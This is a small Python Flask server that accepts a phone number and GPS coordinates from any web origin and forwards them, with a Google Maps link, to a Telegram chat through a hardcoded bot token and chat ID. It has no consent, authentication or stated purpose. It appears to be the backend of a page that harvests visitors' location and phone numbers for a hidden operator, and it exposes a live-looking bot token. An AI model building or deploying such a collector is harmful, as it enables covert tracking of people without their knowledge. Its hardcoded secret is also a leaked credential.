from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

BOT_TOKEN = '7756613979:AAFac7xtNc8G1E9cQm31xOLYxWJlDtQMp0A'
CHAT_ID = '7926224444'  # Adminning chat ID'si

def send_to_telegram(phone, lat, lon):
    text = f"📱 Raqam: {phone}\n📍 Lokatsiya: https://maps.google.com/?q={lat},{lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text}
    requests.post(url, json=payload)

@app.route('/send-location', methods=['POST'])
def send_location():
    data = request.get_json()
    send_to_telegram(data['phone_number'], data['latitude'], data['longitude'])
    return jsonify({'status': 'success'})

if __name__ == "__main__":
    app.run(debug=True)
